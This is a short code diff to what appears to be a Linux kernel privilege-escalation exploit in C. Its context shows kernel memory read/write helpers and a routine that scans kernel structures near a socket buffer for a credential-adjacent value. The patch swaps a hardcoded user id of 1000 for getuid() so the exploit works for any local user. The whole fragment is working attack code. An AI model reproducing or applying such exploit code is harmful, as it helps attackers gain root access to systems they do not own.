@@ -382,6 +382,7 @@ write64(unsigned long addr, unsigned long val) {
 }
 
 static unsigned long find_sk_rcvtimeo() {
+	uid_t uid = getuid();
 	unsigned long skbuff = get_skbuff();
 	/*
 	 * struct sk_buff {
@@ -402,7 +403,7 @@ static unsigned long find_sk_rcvtimeo() {
 	 */
 	for (int i = 0; i < 100; i++, addr += 8) {
 		if(read64(addr) == 0x7FFFFFFFFFFFFFFF) {
-			if(read64(addr - 24) != 1000) {
+			if(read64(addr - 24) != uid) {
 				continue;
 				
 			}
